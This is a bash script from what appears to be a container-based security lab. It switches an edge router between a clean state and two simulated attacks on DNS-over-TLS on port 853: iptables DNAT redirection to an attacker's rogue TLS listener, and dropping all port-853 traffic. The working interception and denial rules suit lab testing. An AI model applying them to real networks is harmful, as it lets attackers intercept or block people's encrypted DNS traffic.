#!/bin/bash
# Phase 7 -- flip edge-router between a clean state and one of the two
# edge-router-side attacks: (ii) rogue-cert redirection, or (iii) deny
# the encrypted transport. (Attack (i)'s corruption lives on the
# attacker container, toggled separately via /tmp/forge_enabled -- see
# capture_evidence.sh.)
#
# Usage (from the host): docker exec edge-router /root/set-attack.sh none|roguecert|deny
set -e
MODE="${1:-none}"

# Always start clean -- remove every rule this script can add, then add
# back only what the requested mode needs. Errors from a rule that
# wasn't present are swallowed (|| true).
iptables -t nat -D PREROUTING -p tcp -d 172.16.2.10 --dport 853 \
  -j DNAT --to-destination 172.16.1.100:853 2>/dev/null || true
iptables -D FORWARD -p tcp --dport 853 -j DROP 2>/dev/null || true
iptables -D FORWARD -p tcp --sport 853 -j DROP 2>/dev/null || true

case "$MODE" in
  none)
    echo "edge-router: clean -- no attack (ii)/(iii) rule active"
    ;;
  roguecert)
    # Attack (ii): redirect any client->resolver:853 connection to the
    # attacker's rogue TLS listener instead of the real resolver.
    iptables -t nat -A PREROUTING -p tcp -d 172.16.2.10 --dport 853 \
      -j DNAT --to-destination 172.16.1.100:853
    echo "edge-router: attack (ii) ON -- client->resolver:853 redirected to the attacker's rogue TLS listener"
    ;;
  deny)
    # Attack (iii): drop all TCP:853 forwarded traffic in both
    # directions -- the encrypted transport becomes unreachable.
    iptables -A FORWARD -p tcp --dport 853 -j DROP
    iptables -A FORWARD -p tcp --sport 853 -j DROP
    echo "edge-router: attack (iii) ON -- all TCP:853 forwarded traffic dropped (encrypted transport denied)"
    ;;
  *)
    echo "usage: $0 none|roguecert|deny" >&2
    exit 1
    ;;
esac
